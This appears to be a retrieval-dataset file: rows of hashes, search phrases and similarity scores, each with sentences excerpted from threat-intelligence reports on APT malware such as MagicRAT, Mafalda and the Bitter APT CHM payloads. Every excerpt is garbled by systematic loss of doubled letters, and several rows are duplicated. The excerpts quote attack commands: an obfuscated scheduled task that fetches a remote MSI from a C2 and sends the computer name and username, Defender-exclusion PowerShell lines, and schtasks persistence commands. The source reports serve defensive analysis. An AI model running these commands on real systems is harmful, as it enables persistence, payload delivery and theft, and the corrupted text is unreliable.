7856ebf4259ae125d28e1268047ceb06,the encrypted data,0.8529851505836112,"['In modern cybersecurity aproaches, authorization could also incorporate other risk factors such as behavioral analytics and evaluation of threat inteligence.', 'Microsoft Digital Defense Report | September 2020 83 TABLE OF CONTENTS INTRODUCTION THE STATE OF CYBERCRIME NATION STATE THREATS SECURITY AND THE REMOTE WORKFORCE ACTIONABLE LEARNINGS GLOSARY breach ciphertext data estate encryption Any incident that results in unauthorized aces of Data or information in its encrypted form used The procedures, services, and infrastructure used to The proces of transforming plaintext into data, aplications, services, networks, and/or devices primarily by cryptology experts.', 'Sometimes refered manage corporate data in the digital estate.', 'ciphertext.', 'by bypasing their underlying security mechanisms.', 'to as encrypted data.', 'A security breach ocurs when an individual or data los prevention (DLP) event an aplication ilegitimately enters a private, cloud aces security broker (CASB) A set of procedures and mechanisms to stop An observable ocurence in an information system confidential, or unauthorized logical IT perimeter.', 'A CASB is a software tol or service that sensitive data from leaving a security boundary.', 'or network.', 'sits betwen an organizations on-premises brownfield infrastructure and a cloud providers infrastructure.', 'denial of service exfiltration Existing deployed IoT/IoT devices that might not They might also provide other services such as An atack that prevents or impairs the authorized The unauthorized transfer of information from an have modern hardware or functionality.']"
ac0df47c7a7c71929ea786a25a27fdd7,decryption.,0.8539491256374303,"['This indicates that the Mafalda implant is a maintained, ongoing project.', 'The figures below depict the functions in the older and the newer Mafalda variant that handle the procesing of the diferent backdor comands based on the comand number.', 'Fig 8: Older Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 13 Fig 9: Newer Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 14 1 htps:/atack.mitre.org/software/S073/ The ful unobfuscated list of comands, along with the developers descriptions, are available in the Mafalda section of the Technical Apendix.', 'The folowing functionality is only available in the newer Mafalda variant: Network and system configuration reconaisance.', 'Information theft and implant orchestration.', 'Data decryption.', 'Filesystem operations.', 'The folowing is a sumary of some of the newer Mafalda comands: Comand 60 Reads the content of the file %USERPROFILE%\\ApData\\Local\\Gogle\\Chrome\\User Data\\Local State and sends the file content to the C2 server as part of a packet with a name prefixed with lot\\.', 'The Local State file stores security-relevant data, such as an encryption key that Chrome uses to protect cokies.', 'The environment variable %USERPROFILE% expands to the path to the profile folder of the user in whose context Mafalda runs, such as C:\\Users\\test for the user test.', 'Comand 61 Decrypts atacker-provided data using the DPAPI (Data Protection Aplication Programing Interface) key of the platform where Mafalda runs.']"
ac0df47c7a7c71929ea786a25a27fdd7,decryption.,0.8539491256374303,"['This indicates that the Mafalda implant is a maintained, ongoing project.', 'The figures below depict the functions in the older and the newer Mafalda variant that handle the procesing of the diferent backdor comands based on the comand number.', 'Fig 8: Older Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 13 Fig 9: Newer Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 14 1 htps:/atack.mitre.org/software/S073/ The ful unobfuscated list of comands, along with the developers descriptions, are available in the Mafalda section of the Technical Apendix.', 'The folowing functionality is only available in the newer Mafalda variant: Network and system configuration reconaisance.', 'Information theft and implant orchestration.', 'Data decryption.', 'Filesystem operations.', 'The folowing is a sumary of some of the newer Mafalda comands: Comand 60 Reads the content of the file %USERPROFILE%\\ApData\\Local\\Gogle\\Chrome\\User Data\\Local State and sends the file content to the C2 server as part of a packet with a name prefixed with lot\\.', 'The Local State file stores security-relevant data, such as an encryption key that Chrome uses to protect cokies.', 'The environment variable %USERPROFILE% expands to the path to the profile folder of the user in whose context Mafalda runs, such as C:\\Users\\test for the user test.', 'Comand 61 Decrypts atacker-provided data using the DPAPI (Data Protection Aplication Programing Interface) key of the platform where Mafalda runs.']"
41d6e1e379006c93e59f114b3161977e,decryption.,0.8016585728073772,"['Payload .VBS file Analysis The folowing screnshot shows a part of the .VBS payload file droped by .RTF file.', 'First line is the encrypted .dl 4th line contains Key to decrypt the .dl.', 'Remaining part is self-explanatory.', 'The instruction c = Crypt(c,k) function decrypts the encrypted dl and returns the decrypted dl.', '(Se the screnshot above) c= encrypted dl.', 'k = decryption key.', 'Folowing function writes byte by byte to the droped.dl file.', 'Finaly, the folowing code executes the regsvr32 comand to run the wmiprvse.dl in silent mode and sets the run key in registry.', 'Payload wmiprvse.dl file Analysis This first level of deobfuscation in wmiprvse.dl takes around 3-4 minutes to finish.', 'Then it alocates memory using VirtualAloc and writes the unpacked code to newly alocated memory before it jumps to the unpacked code as shown in folowing scren shot.', 'This dl has 3 layers of unpacking.']"
41d6e1e379006c93e59f114b3161977e,decryption.,0.8016585728073772,"['Payload .VBS file Analysis The folowing screnshot shows a part of the .VBS payload file droped by .RTF file.', 'First line is the encrypted .dl 4th line contains Key to decrypt the .dl.', 'Remaining part is self-explanatory.', 'The instruction c = Crypt(c,k) function decrypts the encrypted dl and returns the decrypted dl.', '(Se the screnshot above) c= encrypted dl.', 'k = decryption key.', 'Folowing function writes byte by byte to the droped.dl file.', 'Finaly, the folowing code executes the regsvr32 comand to run the wmiprvse.dl in silent mode and sets the run key in registry.', 'Payload wmiprvse.dl file Analysis This first level of deobfuscation in wmiprvse.dl takes around 3-4 minutes to finish.', 'Then it alocates memory using VirtualAloc and writes the unpacked code to newly alocated memory before it jumps to the unpacked code as shown in folowing scren shot.', 'This dl has 3 layers of unpacking.']"
c53da9ec05d78bde1eab4d813ea4924f,decryption.,0.780670919688295,"['{ 3. meta: 4.', '5. description = ""Detects obfuscation paterns used in HALFRIG.', 'This rule wasn\'t tested against large dataset, it should be used for threat hunting and not on services like VTI.""', '6.', '7. strings: 8.', '/ Decryption constants and decryption operation 9.', '$ = {48 B 0B 91 09 19 4D FD 9B F3 } 10.', '1.', '$ = {4D 8D 40 01 48 8B CA 48 8B C2 48 C1 E9 38 48 83 C9 01 48 C1 E0 08 48 8B D1 48 3 D0} 12.', '13.', '$ = {C7 05 [3] 0 F7 91 4D 01 } 14.']"
9f37e71695d9bbc0a254d54d1edbdb58,decryption.,0.7633052540464057,"['Hashes of the analyzed samples .', '6 2.', 'Similarities and diferences .', '7 2.1.', 'General details .', '7 2.2.', 'String decryption .', '9 2.3. AES encryption of the configuration file .', '14 2.4.', 'Format of the (encrypted) configuration file .', '24 2.5.']"
9f37e71695d9bbc0a254d54d1edbdb58,decryption.,0.7633052540464057,"['Hashes of the analyzed samples .', '6 2.', 'Similarities and diferences .', '7 2.1.', 'General details .', '7 2.2.', 'String decryption .', '9 2.3. AES encryption of the configuration file .', '14 2.4.', 'Format of the (encrypted) configuration file .', '24 2.5.']"
3e9312913ace03550c810e6b92ab1d61,whoami.exe,0.8897874484664595,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
3e9312913ace03550c810e6b92ab1d61,whoami.exe,0.8897874484664595,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
5ec66f544ee1add632266a0f85caefec,activity from Tor,0.794063206823338,"['Wecombinethesetwometricstoformanoveralthreat 1 Introduction ranking that we cal the Targeted Threat Index (TI).', 'Whileotherscoringsystemsexistforcharacterizingthe Civil society organizations (CSOs), working on hu- level of severity and danger of a technical vulnerabil- man rights isues around the globe, face a spectrum ity[7,17,41,50], nocomonsystemexistsforanking ofpoliticaly-motivatedinformationsecuritythreatsthat thesophisticationoftargetede-mailatacks.', 'TIalows sektodeny(e.g.', 'Internetfiltering,denial-of-serviceat- us to gain insights into the relative sophistication of so- tacks), manipulate (e.g.', 'website defacements) or moni- cialengineringandmalwareleveragedagainstCSOs.', 'tor (e.g.', 'targeted malware) information related to their Akeytothesucesofourstudyisauniquemethod- work.', 'Targeted malware atacks in particular are an in- ology, combining qualitative and technical analysis of USENIX Asociation 23rd USENIX Security Symposium 527 e-mails and their atachments with fieldwork (e.g.', 'site in Section 4.', 'Training and outreach implications of our visits)andinterviewswithafectedCSOs.', 'Thismethod- workarediscusedinSection5.Wepresentrelatedwork ology,whichwedescribeinmoredetailinSection3,al- inSection6andconcludeinSection7.']"
0e9ec9637a8bfba9a7ffdcaae688abe5,activity from Tor,0.794063206823338,"['Scotsboro City Board of The Payrol Department of the Acount Hijacking P Education Cyber US Link Education Scotsboro City Board of Crime Education fals victim of a phishing scam.', 'The atackers requested W-2 information from al employes.', '01/03/2018 ?', ""Rockdale Independent Schol An email phishing scheme causes Acount Hijacking P Education Cyber US Link District several Rockdale ISD employes' Crime taxes to be falsely filed and compromises confidential tax information for al employes."", '01/03/2018 ?', 'b-tor[.', ']ru Users Researchers from Palo Alto Malware/PoS Malware X Individual Cyber RU Link Networks discover a Rusian Crime BitTorent Site distributing a Monero Miner.', '01/03/2018 ?', 'Colorado Department of For the second time in two weks, Malware/PoS Malware O Public Cyber US Link Transportation (CDOT) the computers at the Colorado administration, Crime Department of Transportation defence, Agency shut down 2,0 compulsory computers after a ransomware social security infection.', '01/03/2018 ?', 'Primary Health Care Primary Health Care notifies Acount Hijacking Q Human health Cyber US Link patients after discovering hack of and social work Crime employe email acounts.']"
08a0ccc49008dbbf532b22d39ac2b886,or delete files,0.9100446427209737,"['Upon execution, MagicRAT achieves persistence for itself by executing a hardcoded comand that creates scheduled tasks on the victim machine.', 'Comand Intent schtasks /create /tn ""OneDrive AutoRemove"" /tr Scheduled task starting at ""C:\\Windows\\System32\\cmd.exe /c del /f /q a specific time C:/TEMP/[MagicRAT_file_name].exe"" /sc daily /st 10:30:30 /ru [T1053/05] SYSTEM Scheduled task starting at schtasks /create /tn ""Microsoft\\Windows\\light Service Manager"" /tr a diferent time an path C:/TEMP/[MagicRAT_file_name].exe /sc onstart /ru SYSTEM [T1053/05] %HOME%/ApData/Roaming/Microsoft/Windows/Start Link created on startup Menu/Programs/Startup/OneNote.lnk folder [T1547/01] Upon achieving persistence, the RAT contacts the C2.', '4/12 During the initial stages of execution, MagicRAT wil perform just enough system reconaisance to identify the system and environment in which the atackers are operating.', 'This is done by executing the comands whoami, systeminfo and ipconfig /al.', 'The last comand has its results returned via the upload of the file zero_dump.mix to the C2.', ""MagicRAT is rather simple it provides the operator with a remote shel on the victim's system for arbitrary comand execution, along with the ability to rename, move and delete files on the endpoint."", 'The operator can determine the timing for the implant to slep, change the C2 URLs and delete the implant from the infected system.', 'We also discovered a new variant of MagicRAT in the wild generated in April 202.', 'This sample now consisted of the ability to delete itself from the infected endpoint using a BAT file.', 'Aditional malware One of the C2 servers used by the new MagicRAT sample, 64[.]18[.]27[.', ']73, hosted two more distinct implants masquerading as GIF URLs.']"
b5d067b705e3d7716dc5cd360e61cc7d,Scheduled task,0.7802401837560938,"['The namespaces and clases from the deobfuscated samples 1 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Al the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.', 'The decrypted strings are as folows: 1.', 'The MagicString clas provides a geter property, which decrypts strings on aces.', '2.', 'The MagicString clas has an encrypted string field.', '3.', 'The MagicString clas provides _Decrypt, a wraper method for decryption.', '4.', 'If it is StealthMutants first time to use the _Decrypt method, the AES (Advanced Encryption Standard) key and initialization vector (IV) wil be initialized based on the hard-coded _factory value, although this IV is meaningles in Electronic Code Block (ECB) mode.', 'The key is the SHA-256 hash, while the IV is the MD5 hash.', 'The values of the SHA-256 and MD5 hashes vary with each StealthMutant sample.']"
751a00c60e4d6cfbca29fd60f12530fc,Scheduled task,0.7899713560434016,"['Tactic ID Name Description Initial ScarCruft uses watering-hole atacks to T189 Drive-by Compromise Aces compromise victims.', 'Execution Comand and Scripting Interpreter: T1059.06 The Dolphin loader a uses Python script.', 'Python 7/8 Tactic ID Name Description Comand and Scripting Interpreter: ScarCruft used malicious JavaScript for a T1059.07 JavaScript watering-hole atack.', 'ScarCruft exploits CVE-2020-1380 to T1203 Exploitation for Client Execution compromise victims.', 'Dolphin uses Windows API functions to execute T106 Native API files and inject proceses.', 'Scheduled Task/Job: Scheduled Dolphin uses a temporary scheduled task to T1053.05 Task start after instalation.', 'Persistence Bot or Logon Autostart Execution: Dolphin uses Run keys for persistence of its T1547.01 Registry Run Keys / Startup Folder loader.', 'Proces Injection: Portable Defense T105.02 Dolphin can inject into other proceses.', 'Executable Injection Evasion T1027 Obfuscated Files or Information Dolphin has encrypted components.', 'Credentials from Pasword Stores: Dolphin can obtain saved paswords from Credential T15.03 Credentials from Web Browsers browsers.', 'Aces T1539 Steal Web Sesion Cokie Dolphin can obtain cokies from browsers.']"
decab25100660c0deaa8f97d0f3bf308,Scheduled task,0.7601237586297603,"['Figure 7.', 'Intrusion flow sequence diagram An overview of whats shown in the sequence diagram above is the folowing: 1.', 'On launch, the primary NoxPlayer executable Nox.exe wil send a request via the API to query update information.', '2.', 'The BigNox API server responds to the client request with specific update information, including the URL to download the update from BigNox legitimate infrastructure.', '3.', 'Nox.exe provides the apropriate parameters to NoxPlayer.exe to download the update.', '4.', 'The legitimate update stored in BigNox infrastructure could have ben replaced with malware, or it may be a new filename/URL not used by legitimate updates.', '5.', 'Malware is instaled on the victims machine.']"
decab25100660c0deaa8f97d0f3bf308,Scheduled task,0.76857650111508,"['Figure 7.', 'Intrusion flow sequence diagram An overview of whats shown in the sequence diagram above is the folowing: 1.', 'On launch, the primary NoxPlayer executable Nox.exe wil send a request via the API to query update information.', '2.', 'The BigNox API server responds to the client request with specific update information, including the URL to download the update from BigNox legitimate infrastructure.', '3.', 'Nox.exe provides the apropriate parameters to NoxPlayer.exe to download the update.', '4.', 'The legitimate update stored in BigNox infrastructure could have ben replaced with malware, or it may be a new filename/URL not used by legitimate updates.', '5.', 'Malware is instaled on the victims machine.']"
399c17d5f44d8b855c9751aae73f3c11,Scheduled task,0.7518470907202128,"['The atackers sent their victims archives containing malicious executable files whose names ended with PDF so that the victim would think it was a real document and open the file.', ""Figure 34 Phishing email Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 81 After the malicious file named paymentSlip.pdf.exe was run on the victim's computer, several files were saved to shared directories."", 'Then the atackers ran PowerShel and aded these files to the MS Windows Defender exclusions list.', '""$windir\\$system32\\WindowsPowerShel\\v1.0\\PowerShel.exe"" Ad-MpPreference -ExclusionPath ""$user\\$apdata\\aPCyDwLsApDgb.exe"" (MITRE: T1562.01 Impair Defenses: Disable or Modify Tols).', 'After that, they used the standard tol named schtasks.exe to create scheduled tasks, and one of the files previously droped onto the computer served as the configuration file for these tasks.', '""$windir\\$system32\\schtasks.exe"" /Create /TN ""Updates\\aPCyDwLsApDgb"" /XML ""$user\\$temp\\tmp8ACB.tmp"" (MITRE: T1053.05 Scheduled Task/Job: Scheduled Task).', 'Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 82 Example launch of malware in Kaspersky Sandbox: Figure 35 Ilustration of an Execution Graph in TIP Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 83 Example 3 Another similar example of a phishing email.', 'The email contains two atached archives: Figure 36 Phishing email When 25th April_PDF.exe is run, it uses PowerShel to change the configuration of Windows Defender: ""$windir\\$system32\\WindowsPowerShel\\v1.0\\PowerShel.exe"" Ad-MpPreference -ExclusionPath ""$selfpath\\$selfname.exe"" (MITRE: T1562.01 Impair Defenses: Disable or Modify Tols).', 'Then it creates a task in the scheduler to achieve persistence: ""$windir\\$system32\\schtasks.exe"" /Create /TN ""Updates\\htOTEVF"" /XML ""$user\\$temp\\tmp56EA.', 'tmp"" (MITRE: T1053.05 Scheduled Task/Job: Scheduled Task).', 'Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 84 Figure 37 Ilustration of an Execution Graph in TIP The 24th April_PDF.exe sample also ads itself to Windows Defender exclusions, then gathers acount credentials from browsers: Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 85 Figure 38 Ilustration of an Execution Graph in TIP Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 86 Figure 39 Atack scenario Droped EXE Start Exclude power malware shel Atachment Contains Masquerading extension PDF EXE Phishing RAR EXE email Droped TMP Importing task Create scheduled task Detection The folowing aproaches are used to detect phishing: Deployment of Secure Email Gateway solutions with dynamic technologies (sandbox) for scaning atachments in emails Analyzing web trafic and identifying suspicious websites that may be linked to phishing atacks by means of malware detection and monitoring systems Giving users the capability to report suspicious emails or websites that they believe are phishing.']"
cae33c8970a53857dff6608fe8894b8a,Scheduled task,1.0,"['Copyright Leonardo S.p.a. Al rights reserved 2 Company General Use MALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE AT&CK TPs T1059 Comand-Line Comand-line interfaces provide a way of interacting with computer Interface systems and is a comon feature acros many types of operating system platforms.', 'One example comand-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Comand-line interfaces can be interacted with localy or remotely via a remote desktop aplication, reverse shel sesion, etc.', 'Comands that are executed run with the curent permision level of the comand-line interface proces unles the comand includes proces invocation that changes permisions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a wel-established method used by both defenders and adversaries to hide open ports from aces.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port wil be opened.', 'Usualy this series of packets consists of atempted conections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often acomplished by the host based firewal, but could also be implemented by custom software.', 'T105 Remote File Files may be copied from one system to another to stage adversary Copy tols or other files over the course of an operation.']"
a9e5224d5686f541f8796eb25399c125,Scheduled task,0.7884814873277122,"['RESEARCH_ Docles Vietnam APT Inovacin y laboratorio April 2019 elevenpaths.com RESEARCH_ Docles Vietnam APT -A technique stil alive- Index What have we discovered?', '.', '3 Globaly Unique Identifier (GUID) .', '3 Docles DOC with thre stages .', '4 DOS OBFUSCATION .', '5 DISKLES POWERSHEL.', '6 The final stage, uninstaling yourself .']"
0797d04ce55799cf7c3246d39567ce99,Scheduled task,0.8551867234600203,"['Analyze The recipients of the document 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf 8.t are (at the end of the document): the deputy minister; - the units under the ministry; - police of provinces and cities directly under the central government; - Department of Inspection of Legal Documents of the Ministry of Justice; - Oficial Journal, Government Electronic Portal, Ministry of Public Security Portal; - Archive: VT, C06 (P1).', 'The document exploits Equation Editor starts aplication (CVE-2017182) to decode the 8.t in memory, after fork to instal two files: C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f and C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da The malware is a dl, it sems to be Gh0st RAT.', 'htps:/ap.any.run/tasks/5715cfe3-250-4808-ad0-1ea4c4fc7a8 An to start the malware, it uses a side loading technics with a scheduled Task.', 'The exe cal in the entry loads dynamicaly wsc.dl and cal the function _run@4 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 1/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Side Loading Scheduled Task The RAT tries to conect to nicetis54.lflink.com|185.216.35.1.', 'htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 2/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Threat Inteligence Consideration We have the same Tps and victimology like Goblin Panda: Oficials Vietnameses Side Loading 8.t RTF kit exploit a dynamic dns name But the payload has changed and the launch of the backdor has changed.', 'Its used a scheduled task.', 'Usualy this group uses NewCoreRat.', 'IOCs Main object- 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha256 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha1 6e670a837970a1fb4161d7d5f720d318d7e4dbc md5 f3451418eb4689560cd6c0c654f26d9 Droped executable file sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 3/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese DNS requests domain nicetis54.lflink.com Conections ip 185.216.35.1 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 4/4']"
0797d04ce55799cf7c3246d39567ce99,Scheduled task,0.8551867234600203,"['Analyze The recipients of the document 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf 8.t are (at the end of the document): the deputy minister; - the units under the ministry; - police of provinces and cities directly under the central government; - Department of Inspection of Legal Documents of the Ministry of Justice; - Oficial Journal, Government Electronic Portal, Ministry of Public Security Portal; - Archive: VT, C06 (P1).', 'The document exploits Equation Editor starts aplication (CVE-2017182) to decode the 8.t in memory, after fork to instal two files: C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f and C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da The malware is a dl, it sems to be Gh0st RAT.', 'htps:/ap.any.run/tasks/5715cfe3-250-4808-ad0-1ea4c4fc7a8 An to start the malware, it uses a side loading technics with a scheduled Task.', 'The exe cal in the entry loads dynamicaly wsc.dl and cal the function _run@4 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 1/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Side Loading Scheduled Task The RAT tries to conect to nicetis54.lflink.com|185.216.35.1.', 'htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 2/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Threat Inteligence Consideration We have the same Tps and victimology like Goblin Panda: Oficials Vietnameses Side Loading 8.t RTF kit exploit a dynamic dns name But the payload has changed and the launch of the backdor has changed.', 'Its used a scheduled task.', 'Usualy this group uses NewCoreRat.', 'IOCs Main object- 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha256 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha1 6e670a837970a1fb4161d7d5f720d318d7e4dbc md5 f3451418eb4689560cd6c0c654f26d9 Droped executable file sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 3/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese DNS requests domain nicetis54.lflink.com Conections ip 185.216.35.1 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 4/4']"
cae33c8970a53857dff6608fe8894b8a,create a scheduled task,0.8433953123588676,"['Copyright Leonardo S.p.a. Al rights reserved 2 Company General Use MALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE AT&CK TPs T1059 Comand-Line Comand-line interfaces provide a way of interacting with computer Interface systems and is a comon feature acros many types of operating system platforms.', 'One example comand-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Comand-line interfaces can be interacted with localy or remotely via a remote desktop aplication, reverse shel sesion, etc.', 'Comands that are executed run with the curent permision level of the comand-line interface proces unles the comand includes proces invocation that changes permisions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a wel-established method used by both defenders and adversaries to hide open ports from aces.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port wil be opened.', 'Usualy this series of packets consists of atempted conections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often acomplished by the host based firewal, but could also be implemented by custom software.', 'T105 Remote File Files may be copied from one system to another to stage adversary Copy tols or other files over the course of an operation.']"
88d674726f92a0b205d41f6b44c23d24,The computer name,0.9942504715728093,[]
88d674726f92a0b205d41f6b44c23d24,The computer name,0.9942504715728093,[]
475cc557a403e5a686bf4e9a5b16e3d2,The computer name,0.775710754431105,"['dedicated USB bot device.', 'Pop!_OS: This is my primary Today, I kep my multi-bot with me operating system.', 'Having a botable at al times.', 'Often, I forget that boting live version alows me to repair or is the main purpose since I also use it restore the system.', 'I can also quickly to transfer large files.', 'The best-case instal the OS to any other computer.', 'scenario is that you wil never ned it.', 'Tails: This botable OS (tails.boum.', 'If you do, you wil be glad you made org) alows me to launch an entire these eforts.', 'OS which is protected by the Tor network.', 'It is beneficial for sensitive investigations which must poses a private conection and leave no trace behind.']"
0d1c0b15d71a2e81bf1d3fc93557761d,the computer name is sent to the C2,0.8178311130445094,"['These can be used to simply execute arbitrary code, in these cases, they are also used to create scheduled tasks for persistence and downloading of the next stage.', 'We have noted multiple versions of these CHM payloads.', 'CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Ofice instaled like the Excel files, and it also uses LZX compresion that wil bypas static malware analysis solutions that do not decompres the file.', 'The first version of the CHM file wil create a scheduled task that wil use the living of the land binary msiexec to execute a remote MSI payload from the C2.', 'String concatenation is used to break up the string for obfuscation.', 'The computer name and the username is also sent to the C2.', '""C:\\Windows\\System32\\schtasks.exe"" /create /sc minute /mo 15 /tn AdobeUpdater /tr ""%coMSPec% /c s^t^a^rt /^m^i^n m^s^i^e^xe^c ^/^i ht^p:/^/mirz^adih^ati^[.', ']com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart"" /ft We did not fetch any aditional payloads from the C2, but we were served empty MSI files, alowing us to discover the names of the next stage payloads.', 'Figure 5: Empty payloads served from diferent C2 servers This may alow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target loks promising enough, thus protecting the next stage of the atack.', 'Biter APT do not apear to change their tactics to much, therefore we can asume that the payloads wil be similar to those observed in 2021, executing a downloader module that can be served with plugins such as a keyloger, remote aces tol, file stealer, or browser credential stealer.', 'The second version of the CHM payload abstracts the same activity through an encoded PowerShel comand stage, obfuscating the activity further than just simple string concatenation.']"
0d1c0b15d71a2e81bf1d3fc93557761d,the username is also sent to the C2.,0.8456263203043786,"['These can be used to simply execute arbitrary code, in these cases, they are also used to create scheduled tasks for persistence and downloading of the next stage.', 'We have noted multiple versions of these CHM payloads.', 'CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Ofice instaled like the Excel files, and it also uses LZX compresion that wil bypas static malware analysis solutions that do not decompres the file.', 'The first version of the CHM file wil create a scheduled task that wil use the living of the land binary msiexec to execute a remote MSI payload from the C2.', 'String concatenation is used to break up the string for obfuscation.', 'The computer name and the username is also sent to the C2.', '""C:\\Windows\\System32\\schtasks.exe"" /create /sc minute /mo 15 /tn AdobeUpdater /tr ""%coMSPec% /c s^t^a^rt /^m^i^n m^s^i^e^xe^c ^/^i ht^p:/^/mirz^adih^ati^[.', ']com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart"" /ft We did not fetch any aditional payloads from the C2, but we were served empty MSI files, alowing us to discover the names of the next stage payloads.', 'Figure 5: Empty payloads served from diferent C2 servers This may alow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target loks promising enough, thus protecting the next stage of the atack.', 'Biter APT do not apear to change their tactics to much, therefore we can asume that the payloads wil be similar to those observed in 2021, executing a downloader module that can be served with plugins such as a keyloger, remote aces tol, file stealer, or browser credential stealer.', 'The second version of the CHM payload abstracts the same activity through an encoded PowerShel comand stage, obfuscating the activity further than just simple string concatenation.']"
